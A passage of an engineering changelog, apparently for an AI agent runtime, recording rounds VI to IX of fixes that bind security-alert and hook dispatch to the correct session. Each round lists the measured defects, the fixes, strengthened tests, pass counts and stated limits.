unmerged, no third-party adaptive red team; NO real-device
multi-platform verification. The slogan engine / cleaning layer /
`mapping.py` / `tui.py` / `runtime_slogans.py` are byte-identical.


---

## B3 Continued VI: C4 Wrap-up -- REAL Session Binding for Module-Level Entry Points

> SELF-CONTAINED heading. NOT A SINGLE MATRIX STATUS CHANGED:
> `aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
> `b_waves_done=["B1"]`. Both B3 catalog entries stay `STATUS_GAP`;
> `catalog.py` is UNCHANGED. Full reproduction: final section of
> `CLAUDE_PARITY.md`.
>
> The previous round honestly left one boundary: `remote_control.notify`,
> the `SecurityAlerter` background thread, and ACP `ask_user` still used
> the global fallback -- cross-wiring was only VISIBLE, not eliminated.
> This round closes it. NO breadth added.

### Five candidates (4 fixed / 1 deliberately not)

| ID | Measured | Verdict |
|---|---|---|
| A | `HookTrigger._effective()` read the global provider on EVERY dispatch; a trigger built under A, after B overrode the provider, dispatched **0 to A / 1 to B** | FIX |
| C | `SecurityAlerter._notify_safely` constructed `HookTrigger()` on the background thread; A subscribed, B overrode -> **0 to A / 1 to B** | FIX |
| D | `remote_control.notify()` had NO hooks parameter; ownership depended entirely on DISPATCH time | FIX |
| E | ACP `KernelAcpBridge.ask_user` had no `self.hooks`; Elicitation events had no session binding | FIX |
| B | `get_alerter()` is a process singleton; the second `home` was silently ignored (`y._home == h1`) | NOT fixed -- rewriting the singleton architecture is out of scope. The regression LOCKS `x is y` as an existing fact; `bind_session_hooks()` makes SERIAL session switches correct |

### Fix
- `hooks/triggers.py`: **freeze hooks at construction** + `owner=` registry
  lookup. `_effective()` no longer reads the global provider. Freshly
  constructed triggers still bind to the CALL-TIME current session (A2
  regression); an unknown `owner` does NOT fall back to default (so a
  typo cannot silently dispatch into another session).
- New owner-partitioned **session registry** (`register_session` /
  `unregister_session` / `resolve_session` /
  `session_registry_diagnostics`): **64-entry upper bound REJECTS, no
  silent LRU eviction** -- a quietly evicted security binding would make
  an old session suddenly dispatch elsewhere or silently no-op.
  `hooks=None` is a valid registration value; unregister does not judge
  emptiness by `pop` return value.
- New `current_session_hooks()` (construction-time snapshot) and
  `bind_session_hooks(hooks, owner=...)` (register + **backfill** the
  already-existing `_global_alerter` / `_notify_rc` singletons -- only
  the `hooks` attribute changes, object identity is preserved).
- Three module-level consumers now use **instance-level binding**:
  `RemoteControl` / `SecurityAlerter` / `KernelAcpBridge` gain a
  `hooks` constructor argument and dispatch with `self.hooks`;
  `remote_control.notify()` gains an optional keyword `hooks`.
  Repo-wide no-arg `HookTrigger()` **code** consumers: 0.
- `security_plugin.py` passes `config._hooks`; `app.py` calls
  `bind_session_hooks` AFTER `set_default_hooks_provider`.

### Three previous-round assertions synchronized (ALL STRENGTHENED)
`test_overrides_are_visible_not_silent` now asserts A receives / B zero;
`test_app_backfills...` adds binding + ordering assertions;
`test_module_level_notify_still_uses_global_fallback` was renamed to
`..._is_now_instance_bound` and asserts zero repo-wide no-arg consumers.

### A-prime x1 (self-caught, in a NEWLY WRITTEN TEST)
The repo-wide source scan counted `HookTrigger()` inside COMMENT lines
(two line comments describing "the previous version"), producing 2 false
positives. Switched to non-comment lines only. ZERO product-code regressions.

### Verification (split batches, NOT one full-suite claim)
B3-VI + previous B3-V + both B3 rounds + 5 existing hooks files + mixin
+ config **185 passed**; wide combined batch (see report);
`matrix.validate()` / `evidence.verify_evidence()` / doc-number check /
`py_compile` all clean. New `tests/test_b3vi_session_binding.py` covers
background-thread dispatch, `bind_session_hooks` backfilling both
singletons, `rc is None` still dispatching, 64-bound REJECT (not evict),
repo-wide source scan, matrix pinning.

### Honest limits
`_global_alerter` / `_notify_rc` are STILL process singletons: two
CONCURRENTLY coexisting sessions share one instance (the later reuses the
earlier binding). The singleton architecture was NOT rewritten -- SERIAL
session switches are fixed, but "complete multi-session isolation" is
NOT claimed. The registry upper-bound rejection only affects explicit
`owner=` lookups; already-bound instances still dispatch (diagnostics
fail-open, adjudication fail-closed -- documented). BEHAVIORAL CHANGES:
freeze-on-construct, three new `hooks` constructor arguments, new
optional `notify()` keyword, one extra `app.py` registration.
`os_sandbox` remains a gap, `deny_network_by_default` remains false,
`credential_masking` remains partial; A-line 10 pending, local fork
unmerged, no third-party adaptive red team; NO real-device
multi-platform verification. The slogan engine / cleaning layer /
`mapping.py` / `tui.py` / `runtime_slogans.py` are byte-identical.


---

## B3 Continued VII: C4 Last Corner -- CONCURRENT Multi-Session Dispatch Ownership

> SELF-CONTAINED heading. NOT A SINGLE MATRIX STATUS CHANGED:
> `aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
> `b_waves_done=["B1"]`. Both B3 catalog entries stay `STATUS_GAP`;
> `catalog.py` is UNCHANGED. Full reproduction: final section of
> `CLAUDE_PARITY.md`.
>
> Round VI honestly left one boundary: `_global_alerter` / `_notify_rc`
> are STILL process singletons, so two CONCURRENTLY coexisting sessions
> share one instance (the later reuses the earlier binding). This round
> closes it. NO breadth added.

### Five candidates (4 fixed / 1 deliberately not)

| ID | Measured | Verdict |
|---|---|---|
| O1 | `bind_session_hooks(B)` **unconditionally backfills** the singleton `hooks`; A's `SecurityAlerter` alerted after B bound -> **0 to A / 1 to B** | FIX |
| O2 | Same root in `remote_control.notify()`: C's SECOND notification landed on **D** | FIX |
| O4 | `contextvars.ContextVar` does NOT cross `threading.Thread` (main `"A"` / child `None`, measured) | FIX (caller bakes owner into the record) |
| O5 | SELF-INTRODUCED while fixing O1/O2 (A-prime): dynamic owner lookup made "unregistered owner" silently return an empty decision = allow | FIX: fail-closed `owner_not_registered` |
| O3 | `get_alerter()` is a process singleton; `SecurityAlerter` owns `AlertLogger(home)` + bus subscription, `RemoteControl` owns a port + session file | NOT fixed -- per-owner multi-instance would introduce file contention, duplicate subscriptions, and port conflicts. The regression LOCKS `x is y` |

### Fix
- `hooks/triggers.py`: new `ContextVar` session owner
  (`current_session_owner` / `set_session_owner` /
  `reset_session_owner`), `hooks_for_owner`, `owner_miss_stats`
  (bounded, `<other>` merge, diagnostics-only). `HookTrigger(owner=)`
  changed from "freeze the resolved VALUE at construction" to
  **freeze the OWNER, resolve via the owner-partitioned registry at
  dispatch time**. The lookup is dynamic but does NOT drift, because
  the registry is bucketed by owner rather than being a single slot:
  `bind(B)` cannot change A's bucket. No-`owner` construction still
  freezes the value (VI's C4-A fix intact). An unknown `owner` does NOT
  fall back to default; decision events additionally fail closed.
- `core/security_alert.py`: `AlertRecord` gains `owner: str = ""`
  (**in-process routing field, NOT serialized in `to_dict()`**, so the
  existing audit format is unchanged); `alert()` captures the owner on
  the CALLING thread and bakes it into the record; the background
  `_notify_safely` thread uses `record.owner` to resolve the bucket,
  sidestepping O4.
- `core/remote_control.py`: `notify()` gains an optional keyword
  `owner`; precedence **explicit hooks > current-session owner bucket >
  instance-frozen hooks**. With an unregistered owner it only uses the
  instance's existing binding -- ZERO behavioral regression.
- `runtime/acp/bridge.py`: `ask_user` supports a registered owner
  bucket; otherwise `self.hooks`. A single bridge can serve multiple
  `session_id`s -- **the `session_id` <-> owner mapping is the caller's
  responsibility; this round does NOT derive it automatically**.
- `app.py`: calls `set_session_owner(_session_owner)` at session start,
  AFTER `set_default_hooks_provider` / `bind_session_hooks`.

### One previous-round assertion synchronized (STRENGTHENED)
`test_module_level_notify_is_now_instance_bound` gains owner-bucket,
`getattr(record, "owner", "")`, `AlertRecord.owner`, and
`current_session_owner` assertions; all three VI assertions remain.

### A-prime x2 (self-caught)
1. **O5** was a risk introduced while fixing O1/O2; caught by a newly
   written regression and made fail-closed.
2. A new assertion checked `"record.owner"`, but the code uses
   `getattr(record, "owner", "")` (compat with older records) -> the
   literal did not match. Switched to the real spelling. ZERO
   product-code regressions.

### Verification (split batches, NOT one full-suite claim)
B3-VII + previous two B3 rounds + 5 existing hooks files + mixin +
config + alert/remote/plugin/bus/bridge/ACP related **330 passed**;
wide combined batches (see report); `matrix.validate()` /
`evidence.verify_evidence()` / doc-number check / `py_compile` all clean.
New `tests/test_b3vii_concurrent_sessions.py` covers background-thread
concurrency, single-slot backfill remaining but unused by owner paths,
`rc is None` still dispatching, contextvar cross-thread, owner hot
replace, O5 fail-closed + bounded misses, O3 singleton identity, matrix
pinning.

### Honest limits
**Singleton OBJECT IDENTITY is still process-wide** (no multi-instance,
avoiding file contention / duplicate bus subscriptions / port conflicts).
What is isolated is DISPATCH OWNERSHIP, not the instance. The
**single-slot backfill in `bind_session_hooks` still exists** (`al.hooks`
is overwritten by the last bind); owner-context dispatch simply does not
read it. Paths with **no owner set and no explicit `hooks`** still use
the last binding (existing behavior) -- "complete multi-session
isolation" is NOT claimed. `owner_miss_stats` is diagnostics-only and
does NOT affect adjudication; the decision fail-closed applies only to
explicit `owner=` lookups that miss. The ACP `session_id` <-> owner
mapping is the caller's job. BEHAVIORAL CHANGES:
`HookTrigger(owner=)` now freezes the owner + resolves dynamically,
`notify()` gains an optional `owner`, `AlertRecord` gains a field,
`app.py` sets a contextvar. `os_sandbox` remains a gap,
`deny_network_by_default` remains false, `credential_masking` remains
partial; A-line 10 pending, local fork unmerged, no third-party
adaptive red team; NO real-device multi-platform verification. The
slogan engine / cleaning layer / `mapping.py` / `tui.py` /
`runtime_slogans.py` are byte-identical.


---

## B3 Continued VIII: Session Lifecycle Close-out + Cross-Thread Owner Handles

> SELF-CONTAINED heading. NOT A SINGLE MATRIX STATUS CHANGED:
> `aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
> `b_waves_done=["B1"]`. Both B3 catalog entries stay `STATUS_GAP`;
> `catalog.py` is UNCHANGED. Full reproduction: final section of
> `CLAUDE_PARITY.md`.
>
> The previous two rounds moved dispatch ownership from a single-slot
> provider to owner buckets, but left three lifecycle / thread-boundary
> gaps. This round digs that same line to the bottom. NO breadth added.

### Six candidates (5 fixed / 1 deliberately not)

| ID | Measured | Verdict |
|---|---|---|
| P1 | `unregister_session` has ZERO production call sites; the registry only grows. After 64 slots fill, `bind_session_hooks(..., owner=NEW)` returns False and `app.py` never checks it -> the 65th session's events silently no-op | FIX |
| P2 | `set_session_owner` was never reset; on same-thread reuse (CLI loop, long-lived ACP server, tests) the owner leaked into the next session | FIX |
| P3 | `ContextVar` does NOT cross `ThreadPoolExecutor` (main `"ctx-main"` / executor `None`, measured); `KernelAcpBridge.ask_user` read the contextvar at RUNTIME, so executor paths degraded to instance-frozen hooks | FIX (explicit handle) |
| P4 | `_bump_owner_miss` read `len()`/`in` OUTSIDE the lock and wrote inside = TOCTOU (no stable out-of-bounds repro under the GIL); the bound was also ambiguous (actually 65) | FIX (lock-scoped + doc) |
| P5 | `bind_session_hooks` docstring said "**3** module-level singletons" while the `for` tuple always had 2; the ACP bridge is a per-agent instance, not a module singleton | FIX (honest wording) |
| O3 | `get_alerter()` is still a process singleton | NOT fixed -- multi-instance would mean file contention, duplicate bus subscriptions, and port conflicts. Regression locks `x is y` |

### Fix
- `hooks/triggers.py`: new `SessionHandle` / `activate_session` /
  `deactivate_session`. Provider injection, contextvar binding, registry
  registration, and singleton backfill collapse into ONE entry point
  returning a handle that carries the reset token; `deactivate`
  unregisters + resets (deliberately does NOT clear the default provider,
  which would break other still-running sessions). Rejected registrations
  now bump a `rejected` counter exposed via `provider_diagnostics()`.
- `app.py`: uses `activate_session`, attaches `session_owner` /
  `session_handle` to `agent.ctx`, and `logger.warning`s on
  `active=False` instead of silently degrading to the single-slot binding.
- `runtime/acp/bridge.py`: new `owner` constructor argument and
  `_resolve_owner()` with precedence **explicit owner >
  `agent.ctx.session_owner` > `current_session_owner()`**. The first two
  are cross-thread stable; `ask_user` uses them. STILL does NOT derive
  owner from `session_id` (one bridge can serve multiple session_ids).
- `_bump_owner_miss`: entire decision moved inside the lock, doc now
  states "at most 64 concrete owners + 1 `<other>` = 65".
- `bind_session_hooks` docstring corrected to "2".

### Four previous-round assertions synchronized (ALL STRENGTHENED)
The four app.py-related assertions now check the single entry point,
ctx attachment, visible `active=False`, exported lifecycle API, and the
absence of the old scattered calls; the bridge assertion gains
`_resolve_owner`; `provider_diagnostics` gains `rejected` consistency.

### A-prime x3 (self-caught)
1. **REAL product defect**: `reset_session_owner` swallowed only
   `ValueError/TypeError`, but `ContextVar.reset()` raises
   `RuntimeError("Token has already been used once")` for a used token ->
   a repeated `deactivate_session` blew up the shutdown path. Caught by
   a newly written regression; now all three exception types are swallowed
   (already-reset == desired state).
2. Four source scans counted a HISTORICAL COMMENT mentioning
   `set_default_hooks_provider(A)/(B)` as a call -> non-comment lines only.
3. The `deactivate_session` scan counted its own `def` line as a host
   call -> exclude `def ` / `from ` lines.

### Verification (split batches, NOT one full-suite claim)
B3-VIII + previous three B3 rounds **131 passed**; existing
hooks/config/alert/remote/plugin/bus/bridge/ACP related **233 passed**;
wide combined batches (see report); `matrix.validate()` /
`evidence.verify_evidence()` / doc-number check / `py_compile` all clean.
New `tests/test_b3viii_session_lifecycle.py`.

### Honest limits
`deactivate_session` is NOT WIRED INTO ALL HOSTS (the project has no
unified agent close hook); this round only provides the API plus
`agent.ctx.session_handle`. A long-running process that never calls it
still fills the 64 slots -- but `rejected` is now visible and `app.py`
warns, so it is no longer silent. **P3 fixes "removing the dependency
on thread context", NOT an observed ACP cross-wiring bug** (`ask_user`
runs on the loop thread via `run_coroutine_threadsafe`, and
`create_agent` also runs there, so the original worked in most cases).
**P4 lock-scoping does NOT correspond to a reproduced out-of-bounds**;
it removes reliance on a GIL implementation detail. Singleton object
identity is still process-wide, single-slot backfill still exists,
`AlertRecord.owner` is still not serialized, and a single bridge still
does not auto-derive owner from `session_id`. BEHAVIORAL CHANGES:
`activate_session` replaces four scattered calls, bridge gains an
`owner` argument and `_resolve_owner()`, `reset_session_owner` swallows
one more exception type, and `session_registry_diagnostics` gains
`rejected`. `os_sandbox` remains a gap, `deny_network_by_default`
remains false, `credential_masking` remains partial; A-line 10 pending,
local fork unmerged, no third-party adaptive red team; NO real-device
multi-platform verification. The slogan engine / cleaning layer /
`mapping.py` / `tui.py` / `runtime_slogans.py` are byte-identical.


---

## B3 Continued IX: Transactional Session Activation + Owner Conflict Rejection + CLI Host Wiring

> SELF-CONTAINED heading. NOT A SINGLE MATRIX STATUS CHANGED:
> `aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
> `b_waves_done=["B1"]`. Both B3 catalog entries stay `STATUS_GAP`;
> `catalog.py` is UNCHANGED. Full reproduction: final section of
> `CLAUDE_PARITY.md`.
>
> Round VIII collapsed the lifecycle into `activate_session` /
> `deactivate_session` and honestly left three boundaries: no host
> called `deactivate`, a rejected registration could still have
> switched the provider, and `SessionHandle` had no closed marker.
> This round digs that same line to the bottom. NO breadth added.

### Six candidates (6 fixed / 5 "not fixed" contracts locked)

| ID | Measured | Verdict |
|---|---|---|
| Q1 | After 64 slots fill, the 65th session's registration returns False BUT `set_default_hooks_provider` already switched to it -> the old session's owner-less consumers now dispatch to the rejected session (measured A fired=0 / NEW=1) | FIX |
| Q1b | `bind_session_hooks` backfilled both module singletons even when registration failed (measured `_global_alerter.hooks` changed to the rejected session's hooks) | FIX |
| Q2 | `"agent:%x" % id(agent)`: CPython reuses `id` for new objects (measured). The old `_SESSIONS[owner] = hooks` SILENTLY OVERWROTE the earlier session, and its stale handle deleted the newer session on `deactivate` (ABA, measured `resolve_session -> None`) | FIX (behavioral change) |
| Q3 | If `bind` raised, the provider was switched, the contextvar was set, and NO handle existed to reset it (measured `current_session_owner` leaked `"sess-boom"`) | FIX |
| Q4 | `deactivate_session` did not clear `agent.ctx.session_owner` / `session_handle`; `bridge._resolve_owner()` still returned the UNREGISTERED owner | FIX |
| Q5 | `SessionHandle` was frozen with no `closed` marker; a repeated deactivate could only be inferred from whether the registry still had the key | FIX |
| Q6 | `deactivate_session` had ZERO production call sites (only the definition and the `__init__` re-export); the registry only grew | FIX (CLI main path wired) |

**Deliberately NOT fixed (regressions lock each)**: `get_alerter()`
is still a process singleton (multi-instance would mean file
contention, duplicate bus subscriptions, port conflicts); one bridge
still does not auto-derive owner from `session_id`; `deactivate`
deliberately does NOT clear the default provider (that would break
other still-running sessions); `AlertRecord.owner` is still not
serialized; ACP server / web / stream_json / TUI.close /
`AcpSession.dispose` are STILL NOT WIRED.

### Fix
- `hooks/triggers.py`: registry registration becomes the SINGLE
  transaction boundary. `bind_session_hooks` returns False immediately
  on failed registration and does NOT backfill singletons.
  `activate_session` now: bind first -> on failure/exception return an
  `active=False, closed=True` handle with ZERO global side effects ->
  only on success inject the provider, bind the contextvar, attach
  owner/handle to `ctx`; if stage 2 itself raises, precisely roll back
  the just-registered slot and reset the token. `register_session`
  rejects any already-present owner (counting `conflicts`);
  `unregister_session(owner, *, expected=)` deletes only when the
  bucket still holds the same hooks object (ABA guard; omitting
  `expected` keeps the old semantics). `SessionHandle` becomes a
  mutable dataclass with `hooks` / `ctx` / `closed`;
  `deactivate_session` checks `closed`, performs precise unregistration,
  and clears ctx residue only when `ctx.session_handle is handle`.
  New `session_scope(...)` context manager (exception-safe auto-close).
- `app.py`: passes `ctx=agent.ctx`; manual attachment removed.
- `cli/cmd_chat.py`: new `_close_agent_session(agent)` called AFTER
  `_run_session_hooks` in BOTH SessionEnd finally blocks (TUI branch
  and plain REPL branch both wired).

### Eleven previous-round assertions synchronized (ALL STRENGTHENED)
The four app.py assertions now check the `ctx=agent.ctx` argument and
that app.py no longer attaches manually; the ordering assertion now
checks `bind < provider < set_owner` plus the failure early-return;
the hot-replace assertion now checks same-owner rejection, `conflicts`
visibility, and dynamic lookup after explicit unregister/register;
diagnostics gains `conflicts`; the "no host wired" assertion becomes
"exactly 1 host call in cmd_chat + others individually locked";
lifecycle API gains `session_scope`; the rejected-docs assertion gains
`conflicts`; the docstring assertion widens its window and adds the
Q1b early-return.

### A-prime x4 (self-caught)
1. **REAL product syntax error**: `hooks/__init__.py` uses backslash
   line continuation; adding `session_scope` with a trailing comma
   produced `SyntaxError` caught by `py_compile` -> fixed to a
   continuation backslash.
2. A newly written docstring contained the literal ``HookTrigger()``,
   which 4 existing repo-wide source scans counted as a consumer
   (they only exclude `#` line comments, not docstrings) -> rephrased
   without parentheses; zero product logic changed.
3. The new Q1b test asserted `Rec.hooks.n`, but "zero side effects"
   correctly means the attribute is NEVER SET -> changed to
   `not hasattr(...)` plus a success-path control so it is not
   vacuously true.
4. The control case used `unregister_session("filler-0")` while
   `fill()` defaults to prefix `f-0` -> fixed to `f-0`.

### Verification (split batches, NOT one full-suite claim)
B3-IX + previous four B3 rounds **196 passed**; existing
hooks/config/alert/remote/plugin/bus/bridge/ACP related **203 passed**;
wide regression A **218 passed**; wide regression B (see report);
`matrix.validate()` / `evidence.verify_evidence()` / doc-number check /
`py_compile` on 10 changed Python files all clean. New
`tests/test_b3ix_session_transaction.py`.

### Honest limits
**Q2 IS A BEHAVIORAL CHANGE**: a second `register_session` for the
same owner now rejects instead of overwriting; in-session hot
replacement requires explicit unregister + register (dynamic lookup
by `HookTrigger(owner=)` still works, regression-verified). **Q3 is
an INJECTED fault**, not an observed production exception; **Q2's id
reuse** is a measured CPython property simulated with an identical
owner string, NOT a claim it happened in production; **Q4 fixes
residual ownership metadata**, not an observed dispatch error
(`ask_user` already checks `resolve_session(_o) is not None`).
**`deactivate` is wired ONLY into the CLI main path**: ACP server /
web / stream_json / TUI.close / `AcpSession.dispose` remain unwired;
`session_scope` provides a unified contract but does not force
migration. Singleton object identity is still process-wide,
single-slot backfill still exists, `AlertRecord.owner` is still not
serialized, and a single bridge still does not auto-derive owner from
`session_id`. `os_sandbox` remains a gap, `deny_network_by_default`
remains false, `credential_masking` remains partial; A-line 10
pending, local fork unmerged, no third-party adaptive red team; NO
real-device multi-platform verification. The slogan engine / cleaning
layer / `mapping.py` / `tui.py` / `runtime_slogans.py` are
byte-identical.
